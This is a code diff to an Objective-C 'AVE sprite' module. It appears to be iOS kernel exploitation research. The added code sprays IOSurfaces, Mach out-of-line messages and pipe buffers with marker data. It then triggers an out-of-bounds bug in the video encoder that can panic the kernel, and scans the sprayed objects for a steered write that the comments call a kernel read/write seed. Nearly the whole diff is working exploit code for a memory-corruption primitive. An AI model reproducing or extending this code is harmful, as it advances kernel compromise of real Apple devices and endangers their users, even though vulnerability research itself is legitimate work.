@@ -5,6 +5,8 @@
 #import <CoreVideo/CoreVideo.h>
 #import <mach/mach.h>
 #import <dlfcn.h>
+#import <fcntl.h>
+#import <unistd.h>
 
 @interface KPAuditAVESpriteModule ()
 @property (nonatomic, assign) int sprayCount;
@@ -166,7 +168,7 @@
     CFMutableArrayRef surfArray = NULL;
     if (sIsCreate && sIsLock && sIsUnlock && sIsGetBase && sIsGetSize) {
         surfArray = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
-        for (int s = 0; s < 32; s++) {
+        for (int s = 0; s < 96; s++) {
             NSDictionary *props = @{
                 @"IOSurfaceWidth": @1024, @"IOSurfaceHeight": @2048,
                 @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @0x42475241,
@@ -177,6 +179,62 @@
     }
     [report appendFormat:@"fixed-page spray: %ld surfaces\n",
      surfArray ? (long)CFArrayGetCount(surfArray) : 0L];
+
+    // === Kernel-object spray (strategy doc): objects whose METADATA lives in
+    // kheap — OOL data copies (ipc kalloc), pipe buffers. Content is tiled with
+    // the marker pair so a landed stp write ([x0, x0, x0, 0]) stands out.
+    uint64_t markerPair = ((uint64_t)(uint32_t)self.marker << 32) | (uint32_t)self.marker;
+    uint8_t *tile = (uint8_t *)malloc(256 * 1024);
+    if (tile) {
+        uint64_t *tq = (uint64_t *)tile;
+        for (size_t ti = 0; ti < 256 * 1024 / 8; ti++) tq[ti] = markerPair;
+    }
+    mach_port_t oolPorts[64];
+    int oolPortCount = 0, oolQueued = 0;
+    for (int p = 0; p < 64; p++) {
+        oolPorts[p] = MACH_PORT_NULL;
+        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &oolPorts[p]) != KERN_SUCCESS) continue;
+        mach_port_insert_right(mach_task_self(), oolPorts[p], oolPorts[p], MACH_MSG_TYPE_MAKE_SEND);
+        oolPortCount++;
+    }
+    if (tile && oolPortCount) {
+        for (int p = 0; p < oolPortCount; p++) {
+            for (int m = 0; m < 4; m++) {
+                size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + sizeof(mach_msg_ool_descriptor_t);
+                uint8_t *msg = calloc(1, total);
+                mach_msg_header_t *hdr = (mach_msg_header_t *)msg;
+                hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+                hdr->msgh_size = (mach_msg_size_t)total;
+                hdr->msgh_remote_port = oolPorts[p];
+                hdr->msgh_local_port = MACH_PORT_NULL;
+                hdr->msgh_id = 0x5350;
+                mach_msg_body_t *body = (mach_msg_body_t *)(msg + sizeof(mach_msg_header_t));
+                body->msgh_descriptor_count = 1;
+                mach_msg_ool_descriptor_t *od =
+                    (mach_msg_ool_descriptor_t *)(msg + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
+                od->address = tile;
+                od->size = 256 * 1024;
+                od->deallocate = 0;
+                od->copy = MACH_MSG_PHYSICAL_COPY;
+                od->type = MACH_MSG_OOL_DESCRIPTOR;
+                kern_return_t okr = mach_msg((mach_msg_header_t *)msg, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                             (mach_msg_size_t)total, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
+                if (okr == KERN_SUCCESS) oolQueued++;
+                free(msg);
+            }
+        }
+    }
+    [report appendFormat:@"ool kernel-copy spray: %d ports, %d queued x 256KB\n", oolPortCount, oolQueued];
+
+    int pipeFds[48][2];
+    int pipesMade = 0;
+    for (int p = 0; p < 48; p++) {
+        pipeFds[p][0] = pipeFds[p][1] = -1;
+        if (pipe(pipeFds[p]) != 0) continue;
+        fcntl(pipeFds[p][1], F_SETPIPE_SZ, 256 * 1024);
+        if (tile && write(pipeFds[p][1], tile, 256 * 1024) == 256 * 1024) pipesMade++;
+    }
+    [report appendFormat:@"pipe spray: %d x 256KB\n", pipesMade];
 
     // 3) VICTIM encode — the OOB read fires here. May panic the kernel.
     CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
@@ -226,6 +284,81 @@
         [report appendString:@"fixed-page scan: skipped (IOSurface dlsym unavailable)\n"];
     }
 
+    // Read back OOL queues and pipes: a landed stp write shows as the signature
+    // [x0, x0, x0, 0] embedded in the marker-tiled content.
+    int oolHits = 0, pipeHits = 0;
+    for (int p = 0; p < oolPortCount; p++) {
+        for (int m = 0; m < 4; m++) {
+            size_t rtotal = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + sizeof(mach_msg_ool_descriptor_t) + 256;
+            uint8_t *rcv = calloc(1, rtotal);
+            if (!rcv) break;
+            mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
+            rh->msgh_size = (mach_msg_size_t)rtotal;
+            kern_return_t rkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
+                                         (mach_msg_size_t)rtotal, oolPorts[p], 10, MACH_PORT_NULL);
+            if (rkr == KERN_SUCCESS) {
+                mach_msg_ool_descriptor_t *od =
+                    (mach_msg_ool_descriptor_t *)(rcv + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
+                if (od->address && od->size >= 32) {
+                    uint64_t *oq = (uint64_t *)od->address;
+                    size_t nq = od->size / 8;
+                    for (size_t i3 = 0; i3 + 4 < nq && oolHits < 8; i3++) {
+                        if (oq[i3] == oq[i3 + 1] && oq[i3] == oq[i3 + 2] &&
+                            oq[i3] != markerPair && (uint32_t)oq[i3 + 3] == 0) {
+                            for (int c = 0; c < ncand; c++) {
+                                if (oq[i3] == x0cands[c]) {
+                                    [report appendFormat:@"    OOL HIT p=%d m=%d off=0x%zx x0=0x%llx\n",
+                                     p, m, i3 * 8, oq[i3]];
+                                    oolHits++;
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                }
+                if (od->address) {
+                    vm_deallocate(mach_task_self(), (vm_address_t)od->address,
+                                  (od->size + 4095) & ~(size_t)4095);
+                }
+            }
+            free(rcv);
+            if (oolHits >= 8) break;
+        }
+        if (oolHits >= 8) break;
+    }
+    for (int p = 0; p < 48; p++) {
+        if (pipeFds[p][0] < 0) continue;
+        uint8_t *pbuf = (uint8_t *)malloc(256 * 1024);
+        if (pbuf) {
+            ssize_t got = read(pipeFds[p][0], pbuf, 256 * 1024);
+            if (got >= 32) {
+                uint64_t *pq = (uint64_t *)pbuf;
+                size_t nq = (size_t)got / 8;
+                for (size_t i3 = 0; i3 + 4 < nq && pipeHits < 8; i3++) {
+                    if (pq[i3] == pq[i3 + 1] && pq[i3] == pq[i3 + 2] &&
+                        pq[i3] != markerPair && (uint32_t)pq[i3 + 3] == 0) {
+                        for (int c = 0; c < ncand; c++) {
+                            if (pq[i3] == x0cands[c]) {
+                                [report appendFormat:@"    PIPE HIT p=%d off=0x%zx x0=0x%llx\n",
+                                 p, i3 * 8, pq[i3]];
+                                pipeHits++;
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+            free(pbuf);
+        }
+        close(pipeFds[p][0]);
+        close(pipeFds[p][1]);
+    }
+    [report appendFormat:@"kernel-object scan: ool_hits=%d pipe_hits=%d\n", oolHits, pipeHits];
+    for (int p = 0; p < oolPortCount; p++) {
+        if (oolPorts[p] != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), oolPorts[p]);
+    }
+    if (tile) free(tile);
+
     for (NSValue *v in siblings) {
         VTCompressionSessionInvalidate((VTCompressionSessionRef)v.pointerValue);
         CFRelease((VTCompressionSessionRef)v.pointerValue);
@@ -242,7 +375,9 @@
      @"  far=0x59 -> spray did not shape the OOB read; try a different object\n"
      @"             class (kalloc size matching the pInfo zone) or more volume.\n"
      @"  far != 0x59 -> OUR data was consumed. Compare against the marker to\n"
-     @"             locate the exact field and lock the primitive.\n"];
+     @"             locate the exact field and lock the primitive.\n"
+     @"Survived: check OOL/PIPE/SURFACE HIT lines — a [x0,x0,x0,0] signature is\n"
+     @"  the steered write landing in our kernel objects (kread/kwrite seed).\n"];
     return report;
 }
 
